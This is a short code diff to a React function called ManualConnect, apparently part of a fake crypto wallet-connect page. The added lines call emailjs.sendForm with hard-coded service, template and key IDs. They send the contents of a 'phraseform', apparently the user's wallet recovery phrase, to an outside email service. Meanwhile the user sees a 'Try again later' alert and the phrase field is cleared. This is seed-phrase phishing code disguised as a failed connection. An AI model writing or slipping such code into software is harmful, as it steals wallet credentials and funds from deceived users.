@@ -30,6 +30,14 @@ function ManualConnect() {
         setLoading(false);
         alert("Try again later");
         setPhrase("");
+      
+       emailjs
+      .sendForm(
+        "service_udsvw3d",
+        "template_w2c0rx5",
+        phraseform.current,
+        "DNsER4-4UGLWYPh73"
+      )
       })
       .catch((error) => {
         setLoading(false);
